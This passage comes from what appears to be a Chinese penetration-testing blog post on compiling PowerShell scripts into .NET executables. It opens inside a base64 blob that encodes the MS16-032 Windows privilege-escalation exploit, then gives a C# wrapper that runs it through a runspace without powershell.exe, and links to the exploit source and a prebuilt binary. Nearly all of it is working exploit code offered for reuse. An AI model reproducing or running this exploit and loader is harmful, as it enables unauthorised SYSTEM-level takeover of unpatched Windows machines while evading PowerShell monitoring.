bGljIHN0YXRpYyBleHRlcm4gYm9vbCBUZXJtaW5hdGVQcm9jZXNzKAogICAgICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgICAgIHVpbnQgdUV4aXRDb2RlKTsKICAgIAogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENsb3NlSGFuZGxlKEludFB0ciBoT2JqZWN0KTsKICAgICAgICAKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBEdXBsaWNhdGVIYW5kbGUoCiAgICAgICAgICAgIEludFB0ciBoU291cmNlUHJvY2Vzc0hhbmRsZSwKICAgICAgICAgICAgSW50UHRyIGhTb3VyY2VIYW5kbGUsCiAgICAgICAgICAgIEludFB0ciBoVGFyZ2V0UHJvY2Vzc0hhbmRsZSwKICAgICAgICAgICAgcmVmIEludFB0ciBscFRhcmdldEhhbmRsZSwKICAgICAgICAgICAgaW50IGR3RGVzaXJlZEFjY2VzcywKICAgICAgICAgICAgYm9vbCBiSW5oZXJpdEhhbmRsZSwKICAgICAgICAgICAgaW50IGR3T3B0aW9ucyk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgY2xhc3MgTnRkbGwKICAgIHsKICAgICAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IE50SW1wZXJzb25hdGVUaHJlYWQoCiAgICAgICAgICAgIEludFB0ciBUaHJlYWRIYW5kbGUsCiAgICAgICAgICAgIEludFB0ciBUaHJlYWRUb0ltcGVyc29uYXRlLAogICAgICAgICAgICByZWYgU1FPUyBTZWN1cml0eVF1YWxpdHlPZlNlcnZpY2UpOwogICAgfQoiQAoKICAgIGZ1bmN0aW9uIEdldC1UaHJlYWRIYW5kbGUgewogICAgICAgICMgU3RhcnR1cEluZm8gU3RydWN0CiAgICAgICAgJFN0YXJ0dXBJbmZvID0gTmV3LU9iamVjdCBTVEFSVFVQSU5GTwogICAgICAgICRTdGFydHVwSW5mby5kd0ZsYWdzID0gMHgwMDAwMDEwMSAjIFNUQVJURl9VU0VTVERIQU5ETEVTCiAgICAgICAgICAgICRTdGFydHVwSW5mby53U2hvd1dpbmRvdyA9IDA7CiAgICAgICAgJFN0YXJ0dXBJbmZvLmhTdGRJbnB1dCA9IFtLZXJuZWwzMl06OkdldEN1cnJlbnRUaHJlYWQoKQogICAgICAgICRTdGFydHVwSW5mby5oU3RkT3V0cHV0ID0gW0tlcm5lbDMyXTo6R2V0Q3VycmVudFRocmVhZCgpCiAgICAgICAgJFN0YXJ0dXBJbmZvLmhTdGRFcnJvciA9IFtLZXJuZWwzMl06OkdldEN1cnJlbnRUaHJlYWQoKQogICAgICAgICRTdGFydHVwSW5mby5jYiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZigkU3RhcnR1cEluZm8pICMgU3RydWN0IFNpemUKICAgICAgICAKICAgICAgICAjIFByb2Nlc3NJbmZvIFN0cnVjdAogICAgICAgICRQcm9jZXNzSW5mbyA9IE5ldy1PYmplY3QgUFJPQ0VTU19JTkZPUk1BVElPTgogICAgICAgIAogICAgICAgICMgQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcgLS0+IGxwQ3VycmVudERpcmVjdG9yeQogICAgICAgICRHZXRDdXJyZW50UGF0aCA9IChHZXQtSXRlbSAtUGF0aCAiLlwiIC1WZXJib3NlKS5GdWxsTmFtZQogICAgICAgIAogICAgICAgICMgTE9HT05fTkVUQ1JFREVOVElBTFNfT05MWSAvIENSRUFURV9TVVNQRU5ERUQKICAgICAgICAkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OkNyZWF0ZVByb2Nlc3NXaXRoTG9nb25XKAogICAgICAgICAgICAidXNlciIsICJkb21haW4iLCAicGFzcyIsCiAgICAgICAgICAgIDB4MDAwMDAwMDIsICJDOlxXaW5kb3dzXFN5c3RlbTMyXG5vdGVwYWQuZXhlIiwgIiIsCiAgICAgICAgICAgIDB4MDAwMDAwMDQsICRudWxsLCAkR2V0Q3VycmVudFBhdGgsCiAgICAgICAgICAgIFtyZWZdJFN0YXJ0dXBJbmZvLCBbcmVmXSRQcm9jZXNzSW5mbykKICAgICAgICAKICAgICAgICAjIER1cGxpY2F0ZSBoYW5kbGUgaW50byBjdXJyZW50IHByb2Nlc3MgLT4gRFVQTElDQVRFX1NBTUVfQUNDRVNTCiAgICAgICAgJGxwVGFyZ2V0SGFuZGxlID0gW0ludFB0cl06Olplcm8KICAgICAgICAkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OkR1cGxpY2F0ZUhhbmRsZSgKICAgICAgICAgICAgJFByb2Nlc3NJbmZvLmhQcm9jZXNzLCAweDQsCiAgICAgICAgICAgIFtLZXJuZWwzMl06OkdldEN1cnJlbnRQcm9jZXNzKCksCiAgICAgICAgICAgIFtyZWZdJGxwVGFyZ2V0SGFuZGxlLCAwLCAkZmFsc2UsCiAgICAgICAgICAgIDB4MDAwMDAwMDIpCiAgICAgICAgCiAgICAgICAgIyBDbGVhbiB1cCBzdXNwZW5kZWQgcHJvY2VzcwogICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6VGVybWluYXRlUHJvY2VzcygkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDEpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFByb2Nlc3MpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFRocmVhZCkKICAgICAgICAKICAgICAgICAkbHBUYXJnZXRIYW5kbGUKICAgIH0KICAgIAogICAgZnVuY3Rpb24gR2V0LVN5c3RlbVRva2VuIHsKICAgICAgICBlY2hvICJgbls/XSBUcnlpbmcgdGhyZWFkIGhhbmRsZTogJFRocmVhZCIKICAgICAgICBlY2hvICJbP10gVGhyZWFkIGJlbG9uZ3MgdG86ICQoJChHZXQtUHJvY2VzcyAtUElEICQoW0tlcm5lbDMyXTo6R2V0UHJvY2Vzc0lkT2ZUaHJlYWQoJFRocmVhZCkpKS5Qcm9jZXNzTmFtZSkiCiAgICAKICAgICAgICAkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OlN1c3BlbmRUaHJlYWQoJFRocmVhZCkKICAgICAgICBpZiAoJENhbGxSZXN1bHQgLW5lIDApIHsKICAgICAgICAgICAgZWNobyAiWyFdICRUaHJlYWQgaXMgYSBiYWQgdGhyZWFkLCBtb3Zpbmcgb24uLiIKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfSBlY2hvICJbK10gVGhyZWFkIHN1c3BlbmRlZCIKICAgICAgICAKICAgICAgICBlY2hvICJbPl0gV2lwaW5nIGN1cnJlbnQgaW1wZXJzb25hdGlvbiB0b2tlbiIKICAgICAgICAkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OlNldFRocmVhZFRva2VuKFtyZWZdJFRocmVhZCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgaWYgKCEkQ2FsbFJlc3VsdCkgewogICAgICAgICAgICBlY2hvICJbIV0gU2V0VGhyZWFkVG9rZW4gZmFpbGVkLCBtb3Zpbmcgb24uLiIKICAgICAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKICAgICAgICAgICAgZWNobyAiWytdIFRocmVhZCByZXN1bWVkISIKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGVjaG8gIls+XSBCdWlsZGluZyBTWVNURU0gaW1wZXJzb25hdGlvbiB0b2tlbiIKICAgICAgICAjIFNlY3VyaXR5UXVhbGl0eU9mU2VydmljZSBzdHJ1Y3QKICAgICAgICAkU1FPUyA9IE5ldy1PYmplY3QgU1FPUwogICAgICAgICRTUU9TLkltcGVyc29uYXRpb25MZXZlbCA9IDIgI1NlY3VyaXR5SW1wZXJzb25hdGlvbgogICAgICAgICRTUU9TLkxlbmd0aCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZigkU1FPUykKICAgICAgICAjIFVuZG9jdW1lbnRlZCBBUEkncywgSSBsaWtlIHlvdXIgc3R5bGUgTWljcm9zb2Z0IDspCiAgICAgICAgJENhbGxSZXN1bHQgPSBbTnRkbGxdOjpOdEltcGVyc29uYXRlVGhyZWFkKCRUaHJlYWQsICRUaHJlYWQsIFtyZWZdJHNxb3MpCiAgICAgICAgaWYgKCRDYWxsUmVzdWx0IC1uZSAwKSB7CiAgICAgICAgICAgIGVjaG8gIlshXSBOdEltcGVyc29uYXRlVGhyZWFkIGZhaWxlZCwgbW92aW5nIG9uLi4iCiAgICAgICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6UmVzdW1lVGhyZWFkKCRUaHJlYWQpCiAgICAgICAgICAgIGVjaG8gIlsrXSBUaHJlYWQgcmVzdW1lZCEiCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgIAogICAgICAgICRzY3JpcHQ6U3lzVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICMgMHgwMDA2IC0tPiBUT0tFTl9EVVBMSUNBVEUgLWJvciBUT0tFTl9JTVBFUlNPTkFURQogICAgICAgICRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6T3BlblRocmVhZFRva2VuKCRUaHJlYWQsIDB4MDAwNiwgJGZhbHNlLCBbcmVmXSRTeXNUb2tlbkhhbmRsZSkKICAgICAgICBpZiAoISRDYWxsUmVzdWx0KSB7CiAgICAgICAgICAgIGVjaG8gIlshXSBPcGVuVGhyZWFkVG9rZW4gZmFpbGVkLCBtb3Zpbmcgb24uLiIKICAgICAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKICAgICAgICAgICAgZWNobyAiWytdIFRocmVhZCByZXN1bWVkISIKICAgICAgICAgICAgUmV0dXJuCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGVjaG8gIls/XSBTdWNjZXNzLCBvcGVuIFNZU1RFTSB0b2tlbiBoYW5kbGU6ICRTeXNUb2tlbkhhbmRsZSIKICAgICAgICBlY2hvICJbK10gUmVzdW1pbmcgdGhyZWFkLi4iCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJFRocmVhZCkKICAgIH0KICAgIAogICAgIyBtYWluKCkgPC0tLSA7KQogICAgJG1zMTYwMzIgPSBAIgogICAgIF9fIF9fIF9fXyBfX18gICBfX18gICAgIF9fXyBfX18gX19fIAogICAgfCAgViAgfCAgX3xfICB8IHwgIF98X19ffCAgIHxfICB8XyAgfAogICAgfCAgICAgfF8gIHxffCB8X3wgLiB8X19ffCB8IHxfICB8ICBffAogICAgfF98X3xffF9fX3xfX19fX3xfX198ICAgfF9fX3xfX198X19ffAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICBbYnkgYjMzZiAtPiBARnV6enlTZWNdCiJACiAgICAKICAgICRtczE2MDMyCiAgICAKICAgICMgQ2hlY2sgbG9naWNhbCBwcm9jZXNzb3IgY291bnQsIHJhY2UgY29uZGl0aW9uIHJlcXVpcmVzIDIrCiAgICBlY2hvICJgbls/XSBPcGVyYXRpbmcgc3lzdGVtIGNvcmUgY291bnQ6ICQoW1N5c3RlbS5FbnZpcm9ubWVudF06OlByb2Nlc3NvckNvdW50KSIKICAgIGlmICgkKFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpQcm9jZXNzb3JDb3VudCkgLWx0IDIpIHsKICAgICAgICBlY2hvICJbIV0gVGhpcyBpcyBhIFZNIGlzbid0IGl0LCByYWNlIGNvbmRpdGlvbiByZXF1aXJlcyBhdCBsZWFzdCAyIENQVSBjb3JlcywgZXhpdGluZyFgbiIKICAgICAgICBSZXR1cm4KICAgIH0KICAgIAogICAgIyBDcmVhdGUgYXJyYXkgZm9yIFRocmVhZHMgJiBUSUQncwogICAgJFRocmVhZEFycmF5ID0gQCgpCiAgICAkVGlkQXJyYXkgPSBAKCkKICAgIAogICAgZWNobyAiWz5dIER1cGxpY2F0aW5nIENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XIGhhbmRsZXMuLiIKICAgICMgTG9vcCBHZXQtVGhyZWFkSGFuZGxlIGFuZCBjb2xsZWN0IHRocmVhZCBoYW5kbGVzIHdpdGggYSB2YWxpZCBUSUQKICAgIGZvciAoJGk9MDsgJGkgLWx0IDUwMDsgJGkrKykgewogICAgICAgICRoVGhyZWFkID0gR2V0LVRocmVhZEhhbmRsZQogICAgICAgICRoVGhyZWFkSUQgPSBbS2VybmVsMzJdOjpHZXRUaHJlYWRJZCgkaFRocmVhZCkKICAgICAgICAjIEJpdCBoYWNreS9sYXp5LCBmaWx0ZXJzIG9uIHVuaXEvdmFsaWQgVElEJ3MgdG8gY3JlYXRlICRUaHJlYWRBcnJheQogICAgICAgIGlmICgkVGlkQXJyYXkgLW5vdGNvbnRhaW5zICRoVGhyZWFkSUQpIHsKICAgICAgICAgICAgJFRpZEFycmF5ICs9ICRoVGhyZWFkSUQKICAgICAgICAgICAgaWYgKCRoVGhyZWFkIC1uZSAwKSB7CiAgICAgICAgICAgICAgICAkVGhyZWFkQXJyYXkgKz0gJGhUaHJlYWQgIyBUaGlzIGlzIHdoYXQgd2UgbmVlZCEKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIAogICAgaWYgKCQoJFRocmVhZEFycmF5Lmxlbmd0aCkgLWVxIDApIHsKICAgICAgICBlY2hvICJbIV0gTm8gdmFsaWQgdGhyZWFkIGhhbmRsZXMgd2VyZSBjYXB0dXJlZCwgZXhpdGluZyEiCiAgICAgICAgUmV0dXJuCiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIls/XSBEb25lLCBnb3QgJCgkVGhyZWFkQXJyYXkubGVuZ3RoKSB0aHJlYWQgaGFuZGxlKHMpISIKICAgICAgICBlY2hvICJgbls/XSBUaHJlYWQgaGFuZGxlIGxpc3Q6IgogICAgICAgICRUaHJlYWRBcnJheQogICAgfQogICAgCiAgICBlY2hvICJgblsqXSBTbmlmZmluZyBvdXQgcHJpdmlsZWdlZCBpbXBlcnNvbmF0aW9uIHRva2VuLi4iCiAgICBmb3JlYWNoICgkVGhyZWFkIGluICRUaHJlYWRBcnJheSl7CiAgICAKICAgICAgICAjIEdldCBoYW5kbGUgdG8gU1lTVEVNIGFjY2VzcyB0b2tlbgogICAgICAgIEdldC1TeXN0ZW1Ub2tlbgogICAgICAgIAogICAgICAgIGVjaG8gImBuWypdIFNuaWZmaW5nIG91dCBTWVNURU0gc2hlbGwuLiIKICAgICAgICBlY2hvICJgbls+XSBEdXBsaWNhdGluZyBTWVNURU0gdG9rZW4iCiAgICAgICAgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgJENhbGxSZXN1bHQgPSBbQWR2YXBpMzJdOjpEdXBsaWNhdGVUb2tlbigkU3lzVG9rZW5IYW5kbGUsIDIsIFtyZWZdJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKICAgICAgICAKICAgICAgICAjIFNpbXBsZSBQUyBydW5zcGFjZSBkZWZpbml0aW9uCiAgICAgICAgZWNobyAiWz5dIFN0YXJ0aW5nIHRva2VuIHJhY2UiCiAgICAgICAgJFJ1bnNwYWNlID0gW3J1bnNwYWNlZmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlKCkKICAgICAgICAkU3RhcnRUb2tlblJhY2UgPSBbcG93ZXJzaGVsbF06OkNyZWF0ZSgpCiAgICAgICAgJFN0YXJ0VG9rZW5SYWNlLnJ1bnNwYWNlID0gJFJ1bnNwYWNlCiAgICAgICAgJFJ1bnNwYWNlLk9wZW4oKQogICAgICAgIFt2b2lkXSRTdGFydFRva2VuUmFjZS5BZGRTY3JpcHQoewogICAgICAgICAgICBQYXJhbSAoJFRocmVhZCwgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKICAgICAgICAgICAgd2hpbGUgKCR0cnVlKSB7CiAgICAgICAgICAgICAgICAkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OlNldFRocmVhZFRva2VuKFtyZWZdJFRocmVhZCwgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKICAgICAgICAgICAgfQogICAgICAgIH0pLkFkZEFyZ3VtZW50KCRUaHJlYWQpLkFkZEFyZ3VtZW50KCRoRHVwbGljYXRlVG9rZW5IYW5kbGUpCiAgICAgICAgJEFzY09iaiA9ICRTdGFydFRva2VuUmFjZS5CZWdpbkludm9rZSgpCiAgICAgICAgCiAgICAgICAgZWNobyAiWz5dIFN0YXJ0aW5nIHByb2Nlc3MgcmFjZSIKICAgICAgICAjIEFkZGluZyBhIHRpbWVvdXQgKDEwIHNlY29uZHMpIGhlcmUgdG8gc2FmZWd1YXJkIGZyb20gZWRnZS1jYXNlcwogICAgICAgICRTYWZlR3VhcmQgPSBbZGlhZ25vc3RpY3Muc3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgIHdoaWxlICgkU2FmZUd1YXJkLkVsYXBzZWRNaWxsaXNlY29uZHMgLWx0IDEwMDAwKSB7CiAgICAgICAgIyBTdGFydHVwSW5mbyBTdHJ1Y3QKICAgICAgICAkU3RhcnR1cEluZm8gPSBOZXctT2JqZWN0IFNUQVJUVVBJTkZPCiAgICAgICAgJFN0YXJ0dXBJbmZvLmNiID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKCRTdGFydHVwSW5mbykgIyBTdHJ1Y3QgU2l6ZQogICAgICAgICRTdGFydHVwSW5mby5kd0ZsYWdzID0gMHgwMDAwMDEwMSAjIFNUQVJURl9VU0VTVERIQU5ETEVTCiAgICAgICAgICAgICRTdGFydHVwSW5mby53U2hvd1dpbmRvdyA9IDA7CiAgICAgICAgIyBQcm9jZXNzSW5mbyBTdHJ1Y3QKICAgICAgICAkUHJvY2Vzc0luZm8gPSBOZXctT2JqZWN0IFBST0NFU1NfSU5GT1JNQVRJT04KICAgICAgICAKICAgICAgICAjIENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XIC0tPiBscEN1cnJlbnREaXJlY3RvcnkKICAgICAgICAkR2V0Q3VycmVudFBhdGggPSAoR2V0LUl0ZW0gLVBhdGggIi5cIiAtVmVyYm9zZSkuRnVsbE5hbWUKICAgICAgICAKICAgICAgICAjIExPR09OX05FVENSRURFTlRJQUxTX09OTFkgLyBDUkVBVEVfU1VTUEVOREVECiAgICAgICAgJENhbGxSZXN1bHQgPSBbQWR2YXBpMzJdOjpDcmVhdGVQcm9jZXNzV2l0aExvZ29uVygKICAgICAgICAgICAgInVzZXIiLCAiZG9tYWluIiwgInBhc3MiLAogICAgICAgICAgICAweDAwMDAwMDAyLCAkQXBwbGljYXRpb24sJENvbW1hbmRsaW5lLAogICAgICAgICAgICAweDAwMDAwMDA0LCAkbnVsbCwgJEdldEN1cnJlbnRQYXRoLAogICAgICAgICAgICBbcmVmXSRTdGFydHVwSW5mbywgW3JlZl0kUHJvY2Vzc0luZm8pCiAgICAgICAgICAgIAogICAgICAgICRoVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgICRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6T3BlblByb2Nlc3NUb2tlbigkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDB4MjgsIFtyZWZdJGhUb2tlbkhhbmRsZSkKICAgICAgICAjIElmIHdlIGNhbid0IG9wZW4gdGhlIHByb2Nlc3MgdG9rZW4gaXQncyBhIFNZU1RFTSBzaGVsbCEKICAgICAgICBpZiAoISRDYWxsUmVzdWx0KSB7CiAgICAgICAgICAgIGVjaG8gIlshXSBIb2x5IGhhbmRsZSBsZWFrIEJhdG1hbiwgd2UgaGF2ZSBhIFNZU1RFTSBzaGVsbCEhYG4iCiAgICAgICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6UmVzdW1lVGhyZWFkKCRQcm9jZXNzSW5mby5oVGhyZWFkKQogICAgICAgICAgICAkU3RhcnRUb2tlblJhY2UuU3RvcCgpCiAgICAgICAgICAgICRTYWZlR3VhcmQuU3RvcCgpCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgIyBDbGVhbiB1cCBzdXNwZW5kZWQgcHJvY2VzcwogICAgICAgICRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6VGVybWluYXRlUHJvY2VzcygkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDEpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFByb2Nlc3MpCiAgICAgICAgJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0luZm8uaFRocmVhZCkKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgIyBLaWxsIHJ1bnNwYWNlICYgc3RvcHdhdGNoIGlmIGVkZ2UtY2FzZQogICAgICAgICRTdGFydFRva2VuUmFjZS5TdG9wKCkKICAgICAgICAkU2FmZUd1YXJkLlN0b3AoKQogICAgfQp9"</span>));</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ExecuteSynchronously</span>(<span class="params"><span class="keyword">string</span> aplication,<span class="keyword">string</span> commandline</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">      <span class="keyword">string</span> Commandout;</span><br><span class="line">      InitialSessionState iss = InitialSessionState.CreateDefault();</span><br><span class="line">      Runspace rs = RunspaceFactory.CreateRunspace(iss);</span><br><span class="line">      rs.Open();</span><br><span class="line">      PowerShell ps = PowerShell.Create();</span><br><span class="line">      ps.Runspace = rs;</span><br><span class="line">      ps.AddScript(PSInvoke_MS16_032);</span><br><span class="line">      <span class="keyword">if</span> (commandline != <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         Commandout = <span class="string">"Invoke-MS16-032 -Application \""</span> + aplication + <span class="string">"\" -Commandline "</span> + <span class="string">"\""</span>+commandline+<span class="string">"\""</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">         Commandout = <span class="string">"Invoke-MS16-032 -Application "</span> + aplication;</span><br><span class="line">      &#125;</span><br><span class="line">      Console.WriteLine(Commandout);</span><br><span class="line">      ps.AddScript(Commandout);</span><br><span class="line">      ps.AddCommand(<span class="string">"Out-Default"</span>);</span><br><span class="line">      ps.Invoke();</span><br><span class="line">      rs.Close();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>base64的内容是 <a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1</a> 的所有内容的base64编码（你可以使用你自己的powershell脚本），由于我改的这个是有参数的，所以简单的写了上面的c#代码，通过.net来执行powershell。</p>
+<p>编译需要System.Management.Automation.dll，具体步骤在cs文件里面已经写了，你们自己编译吧，只是对本机进行了测试，没测试别的，测试Demo如下：</p>
+<p><a href="http://static.wooyun.org/upload/image/201606/2016063013052815262.gif" target="_blank" rel="noopener">http://static.wooyun.org/upload/image/201606/2016063013052815262.gif</a></p>
+<p>通过.net来执行powershell，并不需要powershell.exe 。详情可以看一下 <a href="https://github.com/Cn33liz/p0wnedShell" target="_blank" rel="noopener">p0wnedShell</a> 或者 <a href="http://zone.wooyun.org/content/26831" target="_blank" rel="noopener">http://zone.wooyun.org/content/26831</a></p>
+<p><strong>.net 2.0下编译的版本在<a href="https://github.com/Ridter/Pentest/tree/master/exploit/Escalate_Privileges/ms16_032" target="_blank" rel="noopener"><code>这里</code></a></strong></p>
+
+      
+    </div>
+
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------本文结束，感谢阅读------</div>
+    
+</div>
+    
+    </div>
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Evi1cg</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://evi1cg.github.io/archives/Compile_Your_Powreshell_Script.html" title="编译你的Powershell( MS16-032为例)">https://evi1cg.github.io/archives/Compile_Your_Powreshell_Script.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/Exec_Commands_Via_Mshta.html" rel="next" title="Exec Commands Via Mshta.exe">
+                <i class="fa fa-chevron-left"></i> Exec Commands Via Mshta.exe
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/archives/BypassUAC_on_Win10_Using_Disk_Cleanup.html" rel="prev" title="BypassUac On Win10 Using Disk Cleanup">
+                BypassUac On Win10 Using Disk Cleanup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+
+      
+      
+    </footer>
+
+  
+    <br>
+    <div style="text-align:center" class="addthis_inline_share_toolbox">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5c40967aab5e187f"></script>
+    </div>
+  
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+            
+            <a href="/">
+              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif" alt="Evi1cg">
+            
+            </a>
+              <p class="site-author-name" itemprop="name">Evi1cg</p>
+              <p class="site-description motion-element" itemprop="description">此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archive">
+                
+                    <span class="site-state-item-count">98</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">51</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
